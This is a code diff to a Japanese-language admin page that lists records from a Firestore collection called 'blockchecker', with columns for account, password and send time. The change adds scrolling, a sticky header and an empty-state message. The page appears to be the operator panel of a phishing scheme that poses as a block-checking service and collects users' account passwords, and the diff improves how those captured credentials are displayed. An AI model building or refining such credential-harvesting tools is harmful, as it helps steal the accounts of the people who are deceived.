@@ -6,16 +6,20 @@
 <title>管理者用データ一覧</title>
 <style>
 body { font-family:sans-serif; background:#111; color:#fff; padding:20px;}
-table { width:100%; border-collapse: collapse; margin-top:20px;}
-th, td { border:1px solid #444; padding:8px; text-align:center;}
-th { background:#222;}
-tr:nth-child(even) { background:#1a1a1a;}
-h1 { text-align:center;}
+h1 { text-align:center; margin-bottom:20px; }
+.table-container { max-height:70vh; overflow-y:auto; border:1px solid #444; border-radius:10px; }
+table { width:100%; border-collapse: collapse; }
+th, td { border:1px solid #444; padding:8px; text-align:center; }
+th { background:#222; position:sticky; top:0; }
+tr:nth-child(even) { background:#1a1a1a; }
+#no-data { text-align:center; margin-top:20px; color:#888; }
 </style>
 </head>
 <body>
 <h1>管理者用データ一覧</h1>
-<table id="data-table">
+<div id="no-data">まだデータはありません</div>
+<div class="table-container">
+<table id="data-table" style="display:none;">
 <tr>
   <th>アカウント</th>
   <th>パスワード</th>
@@ -23,6 +27,7 @@ h1 { text-align:center;}
   <th>送信日時</th>
 </tr>
 </table>
+</div>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
@@ -46,6 +51,16 @@ async function showData() {
   const q = query(collection(db, "blockchecker"), orderBy("createdAt","desc"));
   const snapshot = await getDocs(q);
   const table = document.getElementById("data-table");
+  const noData = document.getElementById("no-data");
+
+  if (snapshot.empty) {
+    table.style.display = "none";
+    noData.style.display = "block";
+    return;
+  }
+
+  table.style.display = "table";
+  noData.style.display = "none";
 
   snapshot.forEach(doc => {
     const d = doc.data();
